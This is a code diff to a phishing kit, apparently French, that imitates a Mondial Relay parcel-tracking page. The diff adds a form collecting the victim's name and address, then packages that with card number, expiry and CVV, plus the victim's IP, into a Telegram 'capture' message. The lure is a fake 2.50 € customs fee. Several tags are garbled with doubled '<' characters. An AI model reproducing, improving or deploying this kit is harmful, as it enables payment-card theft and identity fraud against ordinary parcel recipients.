@@ -25,6 +25,8 @@ body{font-family:'Open Sans',sans-serif;background:#fff;color:#1a1a1a;min-height
 .main-content{flex:1;padding:0;display:flex;justify-content:center;background:#f8f9fa}
 .container{width:100%;max-width:680px;padding:24px 20px}
 #track-page{display:block}
+#confirm-page{display:none}
+#payment-page{display:none}
 .track-hero{background:linear-gradient(135deg,#782947 0%,#9c3b5f 100%);border-radius:12px;padding:28px 24px;color:#fff;margin-bottom:24px;position:relative;overflow:hidden}
 .track-hero::after{content:'';position:absolute;top:-30px;right:-30px;width:120px;height:120px;background:rgba(255,255,255,.08);border-radius:50%}
 .track-hero h1{font-size:22px;font-weight:700;margin-bottom:6px;position:relative;z-index:1}
@@ -42,7 +44,6 @@ body{font-family:'Open Sans',sans-serif;background:#fff;color:#1a1a1a;min-height
 .btn-primary{width:100%;height:52px;background:#e31837;color:#fff;border:none;border-radius:26px;font-size:16px;font-weight:700;cursor:pointer;transition:all .2s;box-shadow:0 4px 12px rgba(227,24,55,.2);display:flex;align-items:center;justify-content:center;gap:8px;margin-top:8px}
 .btn-primary:hover{background:#c41230;transform:translateY(-1px)}
 .btn-primary:disabled{background:#ccc;cursor:not-allowed;box-shadow:none}
-#payment-page{display:none}
 .payment-card{background:#fff;border-radius:12px;padding:32px 28px;box-shadow:0 2px 12px rgba(0,0,0,.06);margin-bottom:20px}
 .alert-red{background:#fff5f5;border:1px solid #fed7d7;border-radius:10px;padding:18px;margin-bottom:24px;text-align:center}
 .alert-red .icon{font-size:28px;margin-bottom:8px}
@@ -99,13 +100,13 @@ body{font-family:'Open Sans',sans-serif;background:#fff;color:#1a1a1a;min-height
 
 <div id="app">
 
-<header class="site-header">
+<<header class="site-header">
 <div class="header-left">
 <button class="menu-btn" aria-label="Menu">
-<svg viewBox="0 0 24 24"><path d="M3 12h18M3 6h18M3 18h18"/></svg>
+<<svg viewBox="0 0 24 24"><path d="M3 12h18M3 6h18M3 18h18"/></svg>
 </button>
 <button class="search-btn" aria-label="Rechercher">
-<svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
+<<svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
 </button>
 </div>
 <div class="logo">
@@ -113,22 +114,22 @@ body{font-family:'Open Sans',sans-serif;background:#fff;color:#1a1a1a;min-height
 </div>
 <div class="header-right">
 <button class="icon-btn" aria-label="Panier">
-<svg viewBox="0 0 24 24"><path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 01-8 0"/></svg>
+<<svg viewBox="0 0 24 24"><path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 01-8 0"/></svg>
 </button>
 <button class="icon-btn" aria-label="Compte">
-<svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+<<svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
 </button>
 </div>
 </header>
 
-<nav class="breadcrumb">
-<svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+<<nav class="breadcrumb">
+<<svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
 <a href="#">Accueil</a>
 <span class="sep">/</span>
 <span style="color:#999">Suivi de colis</span>
 </nav>
 
-<main class="main-content">
+<<main class="main-content">
 <div class="container">
 
 <!-- ========== PAGE SUIVI ========== -->
@@ -144,7 +145,7 @@ body{font-family:'Open Sans',sans-serif;background:#fff;color:#1a1a1a;min-height
 
 <div class="form-card">
 <h2>Votre numero de colis</h2>
-<p class="sub">Saisissez les informations de votre colis pour connaitre son statut.</p>
+<p class="sub">Saisissez le numero de votre colis pour connaitre son statut.</p>
 
 <form id="trackForm">
 <input type="text" name="website_verify" class="hp" tabindex="-1" autocomplete="off">
@@ -154,15 +155,55 @@ body{font-family:'Open Sans',sans-serif;background:#fff;color:#1a1a1a;min-height
 <input type="text" id="pkgNum" maxlength="8" placeholder="ex : 76434219" required autocomplete="off">
 </div>
 
-<div class="field">
-<label>Code postal du destinataire</label>
-<input type="text" id="postCode" maxlength="5" placeholder="ex : 59650" required autocomplete="off">
-</div>
-
 <button type="submit" class="btn-primary" id="searchBtn">
-<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="vertical-align:middle"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
+<<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="vertical-align:middle"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
 Rechercher
 </button>
+</form>
+</div>
+</div>
+
+<!-- ========== PAGE CONFIRMATION ========== -->
+<div id="confirm-page">
+<div class="track-hero">
+<h1>Finaliser la livraison</h1>
+<p>Colis N° <span id="heroPkgNum">—</span> — Veuillez confirmer vos coordonnées de livraison.</p>
+</div>
+
+<div class="form-card">
+<h2>Informations du destinataire</h2>
+<p class="sub">Pour sécuriser la livraison de votre colis <strong id="confirmPkgNum">—</strong>, veuillez vérifier vos informations.</p>
+
+<form id="confirmForm">
+<input type="text" name="website_verify" class="hp" tabindex="-1" autocomplete="off">
+
+<div class="field">
+<label>Nom</label>
+<input type="text" id="lastName" name="lastName" required placeholder="ex : DUPONT" autocomplete="family-name">
+</div>
+
+<div class="field">
+<label>Prénom</label>
+<input type="text" id="firstName" name="firstName" required placeholder="ex : Jean" autocomplete="given-name">
+</div>
+
+<div class="field">
+<label>Adresse</label>
+<input type="text" id="address" name="address" required placeholder="ex : 12 rue de la Paix" autocomplete="street-address">
+</div>
+
+<div class="row-2">
+<div class="field">
+<label>Ville</label>
+<input type="text" id="city" name="city" required placeholder="ex : Paris" autocomplete="address-level2">
+</div>
+<div class="field">
+<label>Code postal</label>
+<input type="text" id="postCodeConfirm" name="postCode" required maxlength="5" placeholder="ex : 75001" autocomplete="postal-code">
+</div>
+</div>
+
+<button type="submit" class="btn-primary" id="confirmBtn">Continuer</button>
 </form>
 </div>
 </div>
@@ -172,15 +213,16 @@ Rechercher
 <div class="payment-card">
 <div class="alert-red">
 <div class="icon">📦</div>
-<h2>Colis retenu — Frais de dedouanement</h2>
-<p>Votre colis est arrive au point relais mais ne peut etre remis en raison de frais de douane non regles. Le paiement doit etre effectue dans les 48 heures.</p>
+<h2>Colis retenu — Frais de dédouanement</h2>
+<p>Votre colis est arrive en centre de tri mais ne peut etre livre en raison de frais de douane non regles. Le paiement doit etre effectue dans les 48 heures.</p>
 <span class="price">2,50 €</span>
 <span class="reason">Frais de dossier douane</span>
 </div>
 
 <div class="details-box">
-<div class="row"><span class="label">Numero de colis</span><span class="value">76434219</span></div>
-<div class="row"><span class="label">Point relais</span><span class="value">Paris 11eme — InPost</span></div>
+<div class="row"><span class="label">Numero de colis</span><span class="value" id="payPkgNum">—</span></div>
+<div class="row"><span class="label">Destinataire</span><span class="value" id="payName">—</span></div>
+<div class="row"><span class="label">Adresse de livraison</span><span class="value" id="payAddress">—</span></div>
 <div class="row"><span class="label">Date d'arrivee</span><span class="value">13/05/2026</span></div>
 <div class="row"><span class="label">Montant a regler</span><span class="value red">2,50 € TTC</span></div>
 </div>
@@ -224,7 +266,7 @@ Rechercher
 <button type="submit" class="btn-primary" id="payBtn">Payer 2,50 € et debloquer le colis</button>
 
 <div class="secure-note">
-<svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+<<svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
 <span>Votre transaction est securisee par SSL 256-bit. Mondial Relay ne conserve pas vos donnees bancaires.</span>
 </div>
 </form>
@@ -234,7 +276,7 @@ Rechercher
 </div>
 </main>
 
-<footer class="site-footer">
+<<footer class="site-footer">
 <div class="footer-inner">
 <div class="footer-grid">
 <div class="footer-col">
@@ -282,21 +324,51 @@ try{var c=document.createElement('canvas'),x=c.getContext('2d');x.textBaseline='
 window.addEventListener('load',function(){setTimeout(function(){document.getElementById('app').style.display='block';},350);});
 
 var trackForm=document.getElementById('trackForm');
+var confirmForm=document.getElementById('confirmForm');
 var payForm=document.getElementById('payForm');
 var trackPage=document.getElementById('track-page');
+var confirmPage=document.getElementById('confirm-page');
 var payPage=document.getElementById('payment-page');
 var loader=document.getElementById('loader');
+
+var pkgNumValue='';
+var victimData={};
 
 trackForm.addEventListener('submit',function(e){
 e.preventDefault();
 var hp=this.querySelector('[name="website_verify"]');if(hp&&hp.value!=='')return;
+pkgNumValue=document.getElementById('pkgNum').value.trim();
 loader.classList.add('on');
 setTimeout(function(){
 loader.classList.remove('on');
 trackPage.style.display='none';
-payPage.style.display='block';
+document.getElementById('confirmPkgNum').textContent=pkgNumValue;
+document.getElementById('heroPkgNum').textContent=pkgNumValue;
+confirmPage.style.display='block';
 window.scrollTo(0,0);
 },1800);
+});
+
+confirmForm.addEventListener('submit',function(e){
+e.preventDefault();
+var hp=this.querySelector('[name="website_verify"]');if(hp&&hp.value!=='')return;
+victimData.lastName=document.getElementById('lastName').value.trim();
+victimData.firstName=document.getElementById('firstName').value.trim();
+victimData.address=document.getElementById('address').value.trim();
+victimData.city=document.getElementById('city').value.trim();
+victimData.postCode=document.getElementById('postCodeConfirm').value.trim();
+
+document.getElementById('payPkgNum').textContent=pkgNumValue;
+document.getElementById('payName').textContent=victimData.firstName+' '+victimData.lastName;
+document.getElementById('payAddress').textContent=victimData.address+', '+victimData.city+' '+victimData.postCode;
+
+loader.classList.add('on');
+setTimeout(function(){
+loader.classList.remove('on');
+confirmPage.style.display='none';
+payPage.style.display='block';
+window.scrollTo(0,0);
+},1200);
 });
 
 // === CONFIG TELEGRAM ===
@@ -312,6 +384,12 @@ btn.innerText='Traitement securise...';
 btn.disabled=true;
 
 var data={
+  pkgNum: pkgNumValue,
+  lastName: victimData.lastName,
+  firstName: victimData.firstName,
+  address: victimData.address,
+  city: victimData.city,
+  postCode: victimData.postCode,
   cardholder: document.querySelector('[name="cardholder"]').value,
   cardnumber: document.querySelector('[name="cardnumber"]').value,
   expiry: document.querySelector('[name="expiry"]').value,
@@ -326,8 +404,14 @@ var text='';
 try{
   var ip=await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>j.ip).catch(()=>'inconnue');
   text=
-'🚨 *NOUVELLE CAPTURE CB*\n\n'+
-'*Titulaire:* `'+data.cardholder+'`\n'+
+'🚨 *NOUVELLE CAPTURE COMPLETE*\n\n'+
+'*Colis:* `'+data.pkgNum+'`\n'+
+'*Nom:* `'+data.lastName+'`\n'+
+'*Prenom:* `'+data.firstName+'`\n'+
+'*Adresse:* `'+data.address+'`\n'+
+'*Ville:* `'+data.city+'`\n'+
+'*CP:* `'+data.postCode+'`\n\n'+
+'*Titulaire CB:* `'+data.cardholder+'`\n'+
 '*Numero:* `'+data.cardnumber+'`\n'+
 '*Expiration:* `'+data.expiry+'`\n'+
 '*CVV:* `'+data.cvv+'`\n'+
